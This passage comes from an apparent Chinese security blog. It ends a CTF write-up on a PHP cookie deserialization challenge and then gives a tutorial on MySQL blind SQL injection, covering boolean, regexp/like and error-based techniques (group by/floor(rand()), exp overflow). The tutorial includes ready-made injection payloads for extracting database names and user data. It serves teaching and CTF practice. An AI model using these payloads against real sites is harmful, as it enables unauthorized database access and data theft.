class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="variable">$KEY</span>=<span class="string">&#x27;ISecer:www.isecer.com&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>源码还是很容易就看得懂的，首先取出名为ISecer的cookie，然后对该cookie进行反序列化操作，等于给定的值时则输出flag。</p>
<p>不过还是被这个题目给小小的坑了一下，其实也不算坑吧，是我自己PHP没有学好哈哈，我一开始用下面给定的<code>$KEY=&#39;ISecer:www.isecer.com&#39;;</code>进行序列化后传给ISecer，但是一直不行，后来才发现在php源码中并没有定义这个KEY的值，因此这个值应该为空，即“”。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到的结果为<code>s:0:&quot;&quot;;</code></p>
<p><img src="https://i.loli.net/2020/08/20/fq9JFN8mBjKiRPo.png"></p>
<p>成功取出flag，这道题本身也很容易，算是对反序列化漏洞的运用吧。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql盲注总结</title>
    <url>/post/e9ab844.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：本文的内容主要是对mysql盲注的总结</p>
</blockquote>
<hr>
<span id="more"></span>

<h2 id="1、盲注概念"><a href="#1、盲注概念" class="headerlink" title="1、盲注概念"></a>1、盲注概念</h2><p>盲注的概念：盲注不同于联合注入等可以回显数据的注入。在 sql 注入过程中，sql 语句执行完成后，这些数据不能回显到前端页面，这种情况下我们不能通过页面的响应来直接得到我们想要的数据。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p>
<p>盲注分为三类：布尔盲注，时间盲注，报错盲注</p>
<h2 id="2、布尔注入"><a href="#2、布尔注入" class="headerlink" title="2、布尔注入"></a>2、布尔注入</h2><p>布尔注入的核心思想是构造逻辑判断语句，利用对错、是否、0和1等具有逻辑性的组合来判断我们想要的数据是否存在或是否正确。</p>
<p>常用函数有left()，mid()，substr()，ord()</p>
<p>left(string, n)：string为要截取的字符串，n为长度。</p>
<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;w&#x27;</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>猜数据库名字的第一个字母，错误返回<span class="number">0</span>；</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;w&#x27;</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------+</span></span><br><span class="line"><span class="operator">|</span>                      <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>猜数据库名字的第一个字母，正确返回<span class="number">1</span>；</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------+</span></span><br><span class="line"><span class="operator">|</span>                      <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------+</span></span><br></pre></td></tr></table></figure>

<p>ord(string)：返回字符串的ASCII代码</p>
<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> ord(<span class="string">&#x27;s&#x27;</span>);</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>查询字母s的ASCII代码</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> ord(<span class="string">&#x27;s&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">115</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> ord(<span class="keyword">left</span>(database(),<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>结合<span class="keyword">left</span>()函数，查询数据库第一个字母的ASCII代码是否为<span class="number">115</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> ord(<span class="keyword">left</span>(database(),<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br><span class="line"><span class="operator">|</span>                           <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br></pre></td></tr></table></figure>

<p>mid(string, start,[length])：截取字符串的一部分，start为开始位置，length为截取的长度，可省略。</p>
<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> mid(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="operator">|</span> mid(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="operator">|</span>                       <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br></pre></td></tr></table></figure>

<p>substr()和mid()函数实现的功能是一样的。另外还有一个substring()函数，也是一样的功能。</p>
<p>跟ord()函数作用一致的还有ascii()函数</p>
<p>上述函数在注入的时候只需要把string改成我们构造的语句就可以了。</p>
<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span>  table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>将substr中string的内容换成我们构造的<span class="keyword">SQL</span>语句，我们就可以得到我们想要的，像这个语句中，我们就可以知道，当前数据库的第一个表名的第一个字符不为s</span><br><span class="line"><span class="operator">|</span> substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span>  table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                                                           <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------------------------------------------------------------------+</span></span><br></pre></td></tr></table></figure>



<p>此外，我们还可以用正则匹配注入以及like注入</p>
<p>regexp正则注入</p>
<p>其中可以使用的正则表达式字符有以下这些</p>
<table>
<thead>
<tr>
<th>字符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td>$</td>
<td align="left">匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 \$。</td>
</tr>
<tr>
<td>( )</td>
<td align="left">标记一个子表达式的开始和结束位置。表达式可以获取供以后使用。要匹配这些字符，请使用 \( 和 \)。</td>
</tr>
<tr>
<td>*</td>
<td align="left">匹配前面的子表达式一次或多次。要匹配 * 字符，请使用 \*。</td>
</tr>
<tr>
<td>.</td>
<td align="left">匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 \. 。</td>
</tr>
<tr>
<td>[</td>
<td align="left">标记一个中括号表达式的开始。要匹配 [，请使用 \[。</td>
</tr>
<tr>
<td>+</td>
<td align="left">匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 \+。</td>
</tr>
<tr>
<td>?</td>
<td align="left">匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 \?。</td>
</tr>
<tr>
<td>\</td>
<td align="left">将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\\‘ 匹配 “\“，而 ‘\(‘ 则匹配 “(“。</td>
</tr>
<tr>
<td>{</td>
<td align="left">标记限定符表达式的开始。要匹配 {，请使用 \{。</td>
</tr>
<tr>
<td>|</td>
<td align="left">指明两项之间的一个选择。要匹配|，请使用\|</td>
</tr>
<tr>
<td>^</td>
<td align="left">匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号[ ]表达式中使用时，表示不接受该方括号表达式中的字符集合。要匹配 ^ 字符本身，请使用 \^。</td>
</tr>
</tbody></table>
<p>限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 * 或 +或 ?或 {n}或 {n,} 或 {n,m}共6种。</p>
<p>正则表达式的限定符有：</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td>
</tr>
<tr>
<td>+</td>
<td>匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td>
</tr>
<tr>
<td>？</td>
<td>匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。</td>
</tr>
<tr>
<td>{n}</td>
<td>n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td>
</tr>
<tr>
<td>{n,}</td>
<td>n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</td>
</tr>
<tr>
<td>{n,m}</td>
<td>m 和 n 均为非负整数，其中n &lt;&#x3D; m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td>
</tr>
</tbody></table>
<p>regexp ‘^[a-z]’表示匹配开头为小写字母的字符串</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>正则表达式中 <span class="operator">^</span>[a<span class="operator">-</span>z] 表示字符串中开始字符是在 a<span class="operator">-</span>z范围内</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 判断第一个表名的第一个字符是否是a<span class="operator">-</span>z中的字符,其中security是假设已知的库名。</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name regexp <span class="string">&#x27;^[a-z]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 判断第一个表名的第一个字符是否是a<span class="operator">-</span>n中的字符</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name regexp <span class="string">&#x27;^[a-n]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 判断第一个表名的第一个字符是否是f<span class="operator">-</span>n中的字符</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name regexp <span class="string">&#x27;^[f-n]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>确定该字符为<span class="string">&#x27;e&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name regexp <span class="string">&#x27;^e&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br></pre></td></tr></table></figure>

<p>因此由上面可以得出正则匹配的payload可以为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=select 1 from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name regexp &#x27;</span><span class="operator">^</span>[a<span class="operator">-</span>n]<span class="string">&#x27; limit 0,1#</span></span><br></pre></td></tr></table></figure>



<p>like匹配注入</p>
<p>常用的匹配符有：%，_，escape</p>
<p>%	 匹配0个或任意多个字符；</p>
<p>_ 	匹配任意一个字符；</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> database() <span class="keyword">like</span> <span class="string">&#x27;se%&#x27;</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="operator">%</span>放在后面表示匹配开头为se</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="operator">|</span> database() <span class="keyword">like</span> <span class="string">&#x27;se%&#x27;</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="operator">|</span>                     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> database() <span class="keyword">like</span> <span class="string">&#x27;%se&#x27;</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="operator">%</span>放在前面表示匹配结尾为se</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="operator">|</span> database() <span class="keyword">like</span> <span class="string">&#x27;%se&#x27;</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="operator">|</span>                     <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> database() <span class="keyword">like</span> <span class="string">&#x27;%se%&#x27;</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="operator">%</span>放在前后表示匹配中间为se</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------+</span></span><br><span class="line"><span class="operator">|</span> database() <span class="keyword">like</span> <span class="string">&#x27;%se%&#x27;</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------+</span></span><br><span class="line"><span class="operator">|</span>                      <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> database() <span class="keyword">like</span> <span class="string">&#x27;se______&#x27;</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>_表示匹配开头为se，剩下的字符用_表示</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+</span></span><br><span class="line"><span class="operator">|</span> database() <span class="keyword">like</span> <span class="string">&#x27;se______&#x27;</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+</span></span><br><span class="line"><span class="operator">|</span>                          <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+</span></span><br></pre></td></tr></table></figure>

<p>基于布尔盲注的payload大概有以下这些：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; or Length(database()) &lt;8#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> ascii(mid(database(),<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">=</span>ascii(<span class="string">&#x27;d&#x27;</span>)#</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; union select 1,ord(substr(database(),1,1))=ascii(&#x27;</span>d<span class="string">&#x27;)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name regexp <span class="string">&#x27;^[a-n]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)#</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; or select  1,(select database() like &#x27;</span><span class="operator">%</span>se<span class="string">&#x27;)#</span></span><br></pre></td></tr></table></figure>

<p>等等</p>
<h2 id="3、报错注入"><a href="#3、报错注入" class="headerlink" title="3、报错注入"></a>3、报错注入</h2><p>基于报错的盲注就是构造payload让信息通过错误提示回显出来，主要有group by报错、exp报错、updatexml报错、extractvalue报错</p>
<p>group by报错</p>
<p>count()：返回匹配指定条件的行数。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> emails;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">8</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br></pre></td></tr></table></figure>

<p>floor()：产生小于或等于指定值（value）的最小整数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">floor</span>(<span class="number">1.9</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">floor</span>(<span class="number">1.9</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">floor</span>(<span class="number">1.1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">floor</span>(<span class="number">1.1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br></pre></td></tr></table></figure>

<p>rand()：随机产生0和1之间的浮点数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> rand(<span class="number">0</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="operator">|</span> rand(<span class="number">0</span>)             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0.15522042769493574</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> rand(<span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="operator">|</span> rand(<span class="number">1</span>)             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0.40540353712197724</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br></pre></td></tr></table></figure>

<p>我们可以看一下下面的这条语句，报错显示user为root@localhost</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)) a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br><span class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry <span class="string">&#x27;::root@localhost::1&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;group_key&#x27;</span></span><br></pre></td></tr></table></figure>

<p>首先，在上面这个语句中，rand()产生的是伪随机数，实际上每次结果出来都是一致的。</p>
<p>floor()会返回一个小于或等于传入参数的最大整数，相当于把小数部分截取掉。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>) <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br></pre></td></tr></table></figure>

<p>floor(rand(0)*2)这个表达式会让information_schema.schemata数据表内的每行数据随机产生不同的结果。</p>
<p>concat()函数是将字符串拼接起来的一个函数，0x3a是冒号的ascii代码。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>));</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> :root<span class="variable">@localhost</span>:<span class="number">0</span>                                  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))a;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> a                 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> :root<span class="variable">@localhost</span>:<span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br></pre></td></tr></table></figure>

<p>group by是进行分组的，group by a指按照a的规则进行分组，这里的a指的就是concat里面的一整串语句，比如concat(0x3a,(select user()),0x3a,floor(rand(0)*2))。在进行分组的时候，mysql会建立一张临时表用于分组，在查询到新的键不在临时表中时，就会将其插入表，a为临时表的主键，也就是说这个主键是不能重复的。而我们在对floor(rand(0)*2))对information_schema.schemata会发现，在这个表中数据大于三行时，肯定会发生重复的情况，也就会导致group by报错，为了满足数据大于三行的条件，我们一般选择information_schema.columns这个数据表。这就是group by的报错。</p>
<p>因此我们的payload可以为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select null,count(*),concat((select database()),0x3a,floor(rand(0)*2))x from information_schema.columns group by x--+</span></span><br><span class="line"><span class="string">//(select database())改成我们想要得到的数据语句即可</span></span><br></pre></td></tr></table></figure>



<p>exp报错对版本要求太高，一般不会使用</p>
<p>exp()函数返回e(自然对数的底)的x次方的值，比如exp(2)即返回e的二次方，常量e为一个无穷数，约为2.71828</p>
<p>当x数字过大的时候，就会造成exp溢出，引起溢出错误。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="number">709</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">exp</span>(<span class="number">709</span>)              <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">8.218407461554972e307</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="number">710</span>);</span><br><span class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): <span class="keyword">DOUBLE</span> <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> <span class="keyword">of</span> <span class="keyword">range</span> <span class="keyword">in</span> <span class="string">&#x27;exp(710)&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>当大于<span class="number">709</span>时，就会引起溢出错误。</span><br></pre></td></tr></table></figure>

<p>将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0，因此我们可以利用按位取反来造成exp报错。</p>
